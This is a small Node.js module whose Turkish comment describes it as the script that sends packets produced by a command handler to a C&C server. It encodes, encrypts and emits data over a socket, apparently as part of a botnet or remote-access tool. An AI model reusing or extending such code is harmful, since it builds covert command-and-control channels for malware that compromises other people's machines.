var Packet = require('../models/Packet');
var crypto = require('./crypto');
var parser = require('./parser');

//commandHandler'ın olusturmus olduğu paketleri C&C'ye gonderen script.

module.exports = function(){
    return (function(baseSocket){

        var send = function(data){


            var encoded = parser.encode(data);
            console.log("ENCODED",encoded);
            var encrypted = crypto.encrypt(encoded);
            console.log("ENCRYPTED="+encrypted);

            baseSocket.emit('data', encrypted);

        };

        return {
            send: send
        }
    });
}();